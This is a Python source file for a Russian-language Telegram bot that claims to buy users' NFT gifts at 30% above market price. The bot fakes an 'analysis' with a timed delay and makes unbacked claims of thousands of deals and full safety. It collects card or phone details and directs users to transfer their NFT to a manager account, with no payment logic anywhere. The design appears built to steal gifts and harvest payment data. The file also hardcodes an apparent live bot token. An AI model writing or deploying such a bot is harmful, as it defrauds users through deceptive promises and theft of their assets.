import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import json
import os
from datetime import datetime
import asyncio

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
TOKEN = "8527173088:AAFENDpLWuQmRJe9ioRN4a1IbcnyqGgOkag"
ADMIN_IDS = []  # Добавьте свой ID
MANAGER_USERNAME = "nftsbuyer"

# База данных
DATA_FILE = "data.json"

# База цен подарков (на основе предоставленных данных)
GIFT_PRICES = {
    # Название подарка: (цена_в_рублях, цена_в_звездах)
    "artisanbrick": (13500, 9643),
    "astralshard": (27750, 19821),
    "bdaycandle": (577, 412),
    "berrybox": (1185, 846),
    "bigyear": (600, 429),
    "blingbinky": (4746, 3390),
    "bondedring": (7200, 5143),
    "bowtie": (853, 609),
    "bunnymuffin": (972, 694),
    "candycane": (589, 421),
    "cloverpin": (655, 468),
    "cookieheart": (687, 491),
    "crystalball": (1642, 1173),
    "cupidcharm": (2977, 2126),
    "deskcalendar": (855, 611),
    "diamondring": (4230, 3021),
    "durovscap": (102750, 73393),
    "easteregg": (772, 551),
    "electricskull": (4348, 3106),
    "eternalcandle": (930, 664),
    "eternalrose": (3750, 2679),
    "evileye": (1018, 727),
    "faithamulet": (655, 468),
    "flyingbroom": (1777, 1269),
    "freshsocks": (639, 456),
    "gemsignet": (9718, 6941),
    "genielamp": (7350, 5250),
    "gingercookie": (621, 444),
    "hangingstar": (1213, 866),
    "happybrownie": (624, 446),
    "heartlocket": (259800, 185571),
    "heroichelmet": (32377, 23126),
    "hexpot": (670, 479),
    "holidaydrink": (609, 435),
    "homemadecake": (639, 456),
    "hypnolollipop": (624, 446),
    "icecream": (592, 423),
    "inputkey": (826, 590),
    "instantramen": (603, 431),
    "iongem": (13500, 9643),
    "ionicdryer": (2445, 1746),
    "jackinthebox": (655, 468),
    "jellybunny": (1050, 750),
    "jesterhat": (624, 446),
    "jinglebells": (1215, 868),
    "jollychimp": (1020, 729),
    "joyfulbundle": (966, 690),
    "khabibspapakha": (3598, 2570),
    "kissedfrog": (8550, 6107),
    "lightsword": (843, 602),
    "lolpop": (628, 449),
    "lootbag": (22200, 15857),
    "lovecandle": (1425, 1018),
    "lovepotion": (2262, 1616),
    "lowrider": (7188, 5134),
    "lunarsnake": (574, 410),
    "lushbouquet": (843, 602),
    "madpumpkin": (1800, 1286),
    "magicpotion": (11248, 8034),
    "mightyarm": (23550, 16821),
    "minioscar": (13798, 9856),
    "moneypot": (652, 466),
    "moonpendant": (690, 493),
    "moussecake": (609, 435),
    "nailbracelet": (19500, 13929),
    "nekohelmet": (5550, 3964),
    "partysparkler": (585, 418),
    "perfumebottle": (13650, 9750),
    "petsnake": (592, 423),
    "plushpepe": (1042350, 744536),
    "preciouspeach": (59548, 42534),
    "prettyposy": (654, 467),
    "rarebird": (4273, 3052),
    "recordplayer": (2025, 1446),
    "restlessjar": (688, 491),
    "sakuraflower": (1404, 1003),
    "santahat": (639, 456),
    "scaredcat": (23100, 16500),
    "sharptongue": (6750, 4821),
    "signetring": (4875, 3482),
    "skullflower": (1560, 1114),
    "skystilettos": (2190, 1564),
    "sleighbell": (1248, 891),
    "snakebox": (546, 390),
    "snoopcigar": (1710, 1221),
    "snoopdogg": (702, 501),
    "snowglobe": (702, 501),
    "snowmittens": (936, 669),
    "spicedwine": (685, 489),
    "springbasket": (780, 557),
    "spyagaric": (757, 541),
    "starnotepad": (675, 482),
    "stellarrocket": (670, 479),
    "swagbag": (702, 501),
    "swisswatch": (7158, 5113),
    "tamagadget": (616, 440),
    "tophat": (1572, 1123),
    "toybear": (6240, 4457),
    "trappedheart": (1935, 1382),
    "ufcstrike": (2055, 1468),
    "valentinebox": (1482, 1059),
    "victorymedal": (661, 472),
    "vintagecigar": (4860, 3471),
    "voodoodoll": (4425, 3161),
    "westsidesign": (14998, 10713),
    "whipcupcake": (592, 423),
    "winterwreath": (624, 446),
    "witchhat": (780, 557),
    "xmasstocking": (591, 422),
}

# Синонимы названий (разные варианты написания)
GIFT_SYNONYMS = {
    "durov's cap": "durovscap",
    "durovscap": "durovscap",
    "heart locket": "heartlocket",
    "heartlocket": "heartlocket",
    "plush pepe": "plushpepe",
    "plushpepe": "plushpepe",
    "rare bird": "rarebird",
    "rarebird": "rarebird",
}

def normalize_gift_name(name):
    """Нормализует название подарка для поиска в базе"""
    # Приводим к нижнему регистру и убираем лишние символы
    normalized = re.sub(r'[^a-z0-9]', '', name.lower())
    
    # Проверяем синонимы
    for synonym, original in GIFT_SYNONYMS.items():
        if synonym.replace("'", "").replace(" ", "") in normalized:
            return original
    
    return normalized

def get_gift_price(gift_name):
    """Получает цену подарка по названию"""
    normalized = normalize_gift_name(gift_name)
    
    # Прямое совпадение
    if normalized in GIFT_PRICES:
        return GIFT_PRICES[normalized]
    
    # Поиск по частичному совпадению
    for key, price in GIFT_PRICES.items():
        if key in normalized or normalized in key:
            return price
    
    return None

# Класс для оценки NFT по ссылке
class NFTParser:
    # Регулярное выражение для ссылок на NFT подарки
    NFT_PATTERN = r'https?://t\.me/nft/([a-zA-Z0-9_-]+)-(\d+)'
    
    @classmethod
    def parse_nft_link(cls, link):
        """Парсит ссылку на NFT и возвращает название и номер"""
        match = re.match(cls.NFT_PATTERN, link)
        if match:
            return {
                'name': match.group(1),
                'number': match.group(2),
                'full_link': link
            }
        return None

# Обработчики команд
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    context.user_data.clear()
    context.user_data['state'] = 'main'
    
    # Сохраняем пользователя
    data = load_data()
    if str(user.id) not in data["users"]:
        data["users"][str(user.id)] = {
            "username": user.username,
            "first_name": user.first_name,
            "joined_date": datetime.now().isoformat()
        }
        save_data(data)
    
    welcome_text = (
        f"🌟 Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram, {user.first_name}!\n\n"
        "Мы - профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n\n"
        "🤖 Наш бот автоматически оценивает ваш NFT по ссылке и предлагает цену на 30% выше рынка\n\n"
        "✅ Тысячи успешных сделок\n"
        "⚡ Быстрые выплаты\n"
        "🔒 Полная безопасность\n\n"
        "Выберите действие ниже:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Продать NFT", callback_data='sell')],
        [InlineKeyboardButton("📋 Как проводится сделка?", callback_data='how_it_works')],
        [InlineKeyboardButton("🆘 Поддержка", callback_data='support')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'sell':
        await start_selling(query, context)
    elif query.data == 'how_it_works':
        await show_instructions(query, context)
    elif query.data == 'support':
        await show_support(query, context)
    elif query.data == 'payment_rub':
        await select_payment_rub(query, context)
    elif query.data == 'payment_stars':
        await select_payment_stars(query, context)
    elif query.data == 'back_to_payment':
        await back_to_payment(query, context)
    elif query.data == 'back_to_main':
        await back_to_main(query, context)
    elif query.data == 'check_another':
        await check_another(query, context)
    elif query.data == 'cancel_sale':
        await cancel_sale(query, context)
    elif query.data == 'confirm_deal':
        await confirm_deal(query, context)
    elif query.data == 'reject_deal':
        await reject_deal(query, context)
    elif query.data == 'gift_sent':
        await gift_sent(query, context)

async def start_selling(query, context):
    """Начало процесса продажи - запрос ссылки"""
    context.user_data['state'] = 'waiting_for_link'
    
    text = (
        "🔗 **Отправьте ссылку на ваш NFT-подарок**\n\n"
        "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
        "📌 **Примеры:**\n"
        "• `https://t.me/nft/DurovsCap-1`\n"
        "• `https://t.me/nft/HeartLocket-2`\n"
        "• `https://t.me/nft/PlushPepe-3`\n\n"
        "⚠️ Принимаются только NFT-подарки Telegram"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Единый обработчик всех текстовых сообщений"""
    text = update.message.text.strip()
    current_state = context.user_data.get('state')
    
    # Если ждем ссылку
    if current_state == 'waiting_for_link':
        await handle_nft_link(update, context)
    
    # Если ждем реквизиты
    elif current_state == 'awaiting_details':
        await handle_payment_details(update, context)
    
    # В любом другом случае игнорируем

async def handle_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка полученной ссылки на NFT"""
    link = update.message.text.strip()
    
    # Парсим ссылку
    nft_data = NFTParser.parse_nft_link(link)
    
    if not nft_data:
        text = (
            "❌ **Неправильный формат ссылки!**\n\n"
            "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
            "📌 **Примеры правильных ссылок:**\n"
            "• `https://t.me/nft/DurovsCap-1`\n"
            "• `https://t.me/nft/HeartLocket-2`\n"
            "• `https://t.me/nft/PlushPepe-3`\n\n"
            "Попробуйте снова:"
        )
        
        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        return
    
    # Отправляем сообщение о начале анализа
    analyzing_msg = await update.message.reply_text(
        "🔍 **Анализируем ваш NFT...**\nПожалуйста, подождите несколько секунд.",
        parse_mode='Markdown'
    )
    
    # Имитируем процесс анализа
    await asyncio.sleep(2)
    
    # Получаем цену подарка из базы
    price_info = get_gift_price(nft_data['name'])
    
    if not price_info:
        # Если подарок не найден в базе
        await analyzing_msg.delete()
        text = (
            "❌ **Подарок не найден в нашей базе!**\n\n"
            f"Название: {nft_data['name']}\n\n"
            "Пожалуйста, проверьте правильность названия или обратитесь к менеджеру для ручной оценки."
        )
        keyboard = [[InlineKeyboardButton("🔄 Попробовать другой", callback_data='check_another')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text, reply_markup=reply_markup)
        return
    
    market_rub, market_stars = price_info
    our_rub = round(market_rub * 1.3)
    our_stars = round(market_stars * 1.3)
    
    # Сохраняем данные
    context.user_data['nft_info'] = {
        'link': nft_data['full_link'],
        'name': nft_data['name'],
        'number': nft_data['number'],
        'market_rub': market_rub,
        'market_stars': market_stars,
        'our_rub': our_rub,
        'our_stars': our_stars
    }
    
    # Удаляем сообщение об анализе
    await analyzing_msg.delete()
    
    # Показываем результат оценки
    text = (
        "✅ **🔍 Анализ NFT завершён!**\n\n"
        f"📎 **Ваш NFT:** {nft_data['full_link']}\n"
        f"🏷 **Рыночная стоимость:** {market_rub:,} ₽ / {market_stars:,} ⭐️\n"
        f"💰 **Наше предложение (+30%):** {our_rub:,} ₽ / {our_stars:,} ⭐️\n\n"
        "**Выберите способ получения оплаты:**"
    )
    
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Карта — Россия (RUB)", callback_data='payment_rub')],
        [InlineKeyboardButton("⭐️ Звезды (Telegram Stars)", callback_data='payment_stars')],
        [InlineKeyboardButton("🔄 Проверить другой NFT", callback_data='check_another')],
        [InlineKeyboardButton("❌ Отмена", callback_data='cancel_sale')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # Меняем состояние
    context.user_data['state'] = 'awaiting_payment'

async def select_payment_rub(query, context):
    """Выбор оплаты в рублях"""
    context.user_data['payment_method'] = 'rub'
    context.user_data['payment_name'] = '🇷🇺 Карта — Россия (RUB)'
    context.user_data['state'] = 'awaiting_details'
    
    nft_info = context.user_data.get('nft_info', {})
    
    text = (
        f"💳 **Способ оплаты:** 🇷🇺 Карта — Россия (RUB)\n\n"
        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
        f"🏷 **Рыночная стоимость:** ~{nft_info.get('market_rub'):,} ₽\n"
        f"💰 **Наше предложение:** {nft_info.get('our_rub'):,} ₽ (+30%)\n\n"
        "📝 **Введите ваши реквизиты для получения оплаты:**\n"
        "(Номер карты, телефон и т.д.)"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад к выбору оплаты", callback_data='back_to_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def select_payment_stars(query, context):
    """Выбор оплаты в звездах"""
    context.user_data['payment_method'] = 'stars'
    context.user_data['payment_name'] = '⭐️ Звезды (Telegram Stars)'
    context.user_data['state'] = 'awaiting_details'
    
    nft_info = context.user_data.get('nft_info', {})
    
    text = (
        f"💳 **Способ оплаты:** ⭐️ Звезды (Telegram Stars)\n\n"
        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
        f"🏷 **Рыночная стоимость:** ~{nft_info.get('market_stars'):,} ⭐️\n"
        f"💰 **Наше предложение:** {nft_info.get('our_stars'):,} ⭐️ (+30%)\n\n"
        "📝 **Введите ваш @username для получения оплаты:**"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад к выбору оплаты", callback_data='back_to_payment')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def back_to_payment(query, context):
    """Возврат к выбору оплаты"""
    nft_info = context.user_data.get('nft_info', {})
    context.user_data['state'] = 'awaiting_payment'
    
    text = (
        "✅ **🔍 Анализ NFT завершён!**\n\n"
        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
        f"🏷 **Рыночная стоимость:** {nft_info.get('market_rub'):,} ₽ / {nft_info.get('market_stars'):,} ⭐️\n"
        f"💰 **Наше предложение (+30%):** {nft_info.get('our_rub'):,} ₽ / {nft_info.get('our_stars'):,} ⭐️\n\n"
        "**Выберите способ получения оплаты:**"
    )
    
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Карта — Россия (RUB)", callback_data='payment_rub')],
        [InlineKeyboardButton("⭐️ Звезды (Telegram Stars)", callback_data='payment_stars')],
        [InlineKeyboardButton("🔄 Проверить другой NFT", callback_data='check_another')],
        [InlineKeyboardButton("❌ Отмена", callback_data='cancel_sale')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_payment_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка введенных реквизитов"""
    details = update.message.text.strip()
    context.user_data['payment_details'] = details
    
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    payment_name = context.user_data.get('payment_name')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        market = nft_info.get('market_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        market = nft_info.get('market_stars')
        currency = '⭐️'
    
    text = (
        f"📎 **Ваш NFT:** {nft_info.get('link')}\n"
        f"💳 **Способ оплаты:** {payment_name}\n\n"
        f"🏷 **Рыночная стоимость:** ~{market:,} {currency}\n"
        f"💰 **Наше предложение:** {amount:,} {currency}\n\n"
        f"💬 Я предлагаю вам за ваш NFT {nft_info.get('link')} сумму {amount:,} {currency}\n\n"
        "Если согласны — нажмите **Да**, если нет — **Нет** 👇"
    )
    
    keyboard = [
        [InlineKeyboardButton("✅ Да", callback_data='confirm_deal')],
        [InlineKeyboardButton("❌ Нет", callback_data='reject_deal')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    context.user_data['state'] = 'awaiting_confirmation'

async def confirm_deal(query, context):
    """Подтверждение сделки"""
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    payment_name = context.user_data.get('payment_name')
    payment_details = context.user_data.get('payment_details')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        currency = '⭐️'
    
    # Сохраняем транзакцию
    data = load_data()
    transaction = {
        "id": len(data["transactions"]) + 1,
        "user_id": query.from_user.id,
        "username": query.from_user.username,
        "nft_link": nft_info.get('link'),
        "nft_name": nft_info.get('name'),
        "nft_number": nft_info.get('number'),
        "payment_method": payment_method,
        "payment_name": payment_name,
        "payment_details": payment_details,
        "amount": amount,
        "currency": currency,
        "status": "confirmed",
        "created_at": datetime.now().isoformat()
    }
    data["transactions"].append(transaction)
    save_data(data)
    
    text = (
        f"✅ **Отлично!**\n\n"
        f"Теперь вам нужно отправить ваш NFT менеджеру @{MANAGER_USERNAME}\n\n"
        f"📎 **NFT:** {nft_info.get('link')}\n"
        f"💵 **Сумма выплаты:** {amount:,} {currency}\n"
        f"💳 **Способ оплаты:** {payment_name}\n\n"
        f"Менеджер проверит подарок и переведёт оплату на ваши реквизиты.\n"
        f"⚡️ Среднее время сделки: 5–15 минут\n\n"
        f"⚠️ **Важно:** передавайте NFT ТОЛЬКО через @{MANAGER_USERNAME}. "
        f"Мы не несём ответственности за сделки вне официального канала."
    )
    
    # Добавляем кнопку "Подарок передан"
    keyboard = [
        [InlineKeyboardButton("✅ Подарок передан", callback_data='gift_sent')],
        [InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def gift_sent(query, context):
    """Обработчик кнопки 'Подарок передан'"""
    nft_info = context.user_data.get('nft_info', {})
    payment_method = context.user_data.get('payment_method')
    
    if payment_method == 'rub':
        amount = nft_info.get('our_rub')
        currency = '₽'
    else:
        amount = nft_info.get('our_stars')
        currency = '⭐️'
    
    # Обновляем статус транзакции
    data = load_data()
    for t in data["transactions"]:
        if t.get("nft_link") == nft_info.get('link') and t.get("user_id") == query.from_user.id:
            t["status"] = "gift_sent"
            t["gift_sent_at"] = datetime.now().isoformat()
            break
    save_data(data)
    
    text = (
        f"✅ **Спасибо! Менеджер уведомлен о передаче подарка.**\n\n"
        f"📎 **NFT:** {nft_info.get('link')}\n"
        f"💵 **Сумма выплаты:** {amount:,} {currency}\n\n"
        f"Ожидайте поступления оплаты в течение 5–15 минут.\n"
        f"Если возникнут вопросы, обращайтесь к @{MANAGER_USERNAME}"
    )
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    # Уведомление админам о том, что подарок передан
    for admin_id in ADMIN_IDS:
        try:
            admin_text = (
                f"📦 **Подарок передан!**\n\n"
                f"👤 **Пользователь:** @{query.from_user.username}\n"
                f"🆔 **ID:** {query.from_user.id}\n"
                f"📎 **NFT:** {nft_info.get('link')}\n"
                f"💰 **Сумма:** {amount:,} {currency}\n"
                f"⏰ **Время:** {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            )
            await context.bot.send_message(admin_id, admin_text, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to notify admin {admin_id}: {e}")
    
    context.user_data.clear()

async def reject_deal(query, context):
    """Отмена сделки"""
    text = "❌ Сделка отменена. Возвращаемся в главное меню."
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup)
    context.user_data.clear()

async def check_another(query, context):
    """Проверка другого NFT"""
    context.user_data['state'] = 'waiting_for_link'
    
    text = (
        "🔗 **Отправьте ссылку на другой NFT-подарок**\n\n"
        "Формат: `https://t.me/nft/НАЗВАНИЕ-НОМЕР`\n\n"
        "📌 **Примеры:**\n"
        "• `https://t.me/nft/DurovsCap-1`\n"
        "• `https://t.me/nft/HeartLocket-2`\n"
        "• `https://t.me/nft/PlushPepe-3`"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def cancel_sale(query, context):
    """Отмена продажи"""
    text = "❌ Продажа отменена. Возвращаемся в главное меню."
    
    keyboard = [[InlineKeyboardButton("🏠 В главное меню", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup)
    context.user_data.clear()

async def show_instructions(query, context):
    """Инструкция по сделке"""
    instructions = (
        "🤝 **Как проводится сделка:**\n\n"
        "1. Вы присылаете ссылку на NFT-подарок\n"
        "2. Бот находит цену в базе данных\n"
        "3. Вы выбираете способ оплаты\n"
        "4. Бот озвучивает свою сумму в вашей валюте (+30%)\n\n"
        "Пример: Я предлагаю вам за ваш NFT https://t.me/nft/HeartLocket-2  — 337,740 Рублей\n"
        "Если согласны — нажмите Да, если нет — Нет\n\n"
        "5. При согласии — отправьте NFT менеджеру @nftsbuyer\n"
        "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
        "⚡️ Среднее время сделки: 5–15 минут"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(instructions, reply_markup=reply_markup, parse_mode='Markdown')

async def show_support(query, context):
    """Поддержка"""
    support_text = (
        "🆘 **Поддержка**\n\n"
        f"По всем вопросам обращайтесь к менеджеру @{MANAGER_USERNAME}\n\n"
        "⏰ **Время работы:** 24/7\n\n"
        "Среднее время ответа: 5-10 минут"
    )
    
    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data='back_to_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(support_text, reply_markup=reply_markup, parse_mode='Markdown')

async def back_to_main(query, context):
    """Возврат в главное меню"""
    context.user_data.clear()
    
    user = query.from_user
    first_name = user.first_name
    
    welcome_text = (
        f"🌟 Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram, {first_name}!\n\n"
        "Мы - профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n\n"
        "🤖 Наш бот автоматически оценивает ваш NFT по ссылке и предлагает цену на 30% выше рынка\n\n"
        "✅ Тысячи успешных сделок\n"
        "⚡ Быстрые выплаты\n"
        "🔒 Полная безопасность\n\n"
        "Выберите действие ниже:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Продать NFT", callback_data='sell')],
        [InlineKeyboardButton("📋 Как проводится сделка?", callback_data='how_it_works')],
        [InlineKeyboardButton("🆘 Поддержка", callback_data='support')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика для админов"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет прав для этой команды.")
        return
    
    data = load_data()
    total_users = len(data["users"])
    total_transactions = len(data["transactions"])
    pending = sum(1 for t in data["transactions"] if t["status"] == "pending")
    confirmed = sum(1 for t in data["transactions"] if t["status"] == "confirmed")
    gift_sent = sum(1 for t in data["transactions"] if t["status"] == "gift_sent")
    
    stats = (
        f"📊 **Статистика бота**\n\n"
        f"👥 **Пользователей:** {total_users}\n"
        f"📦 **Всего транзакций:** {total_transactions}\n"
        f"⏳ **В обработке:** {pending}\n"
        f"✅ **Подтверждено:** {confirmed}\n"
        f"📤 **Подарков передано:** {gift_sent}\n"
    )
    
    await update.message.reply_text(stats, parse_mode='Markdown')

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "transactions": []}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def main():
    print("=" * 50)
    print("ЗАПУСК БОТА ДЛЯ СКУПКИ NFT")
    print("=" * 50)
    
    try:
        # Создание приложения
        application = Application.builder().token(TOKEN).build()
        
        # Регистрация обработчиков
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stats", admin_stats))
        application.add_handler(CallbackQueryHandler(button_handler))
        
        # Единый обработчик для всех текстовых сообщений
        application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            handle_message
        ))
        
        print("✅ Бот успешно инициализирован!")
        print("🚀 Запуск polling...")
        
        # Запуск бота
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
    except Exception as e:
        print(f"❌ Ошибка при запуске: {e}")
        print("\nПроверьте:")
        print("1. Правильность токена")
        print("2. Интернет-соединение")
        print("3. Не заблокирован ли Telegram")

if __name__ == '__main__':
    main()
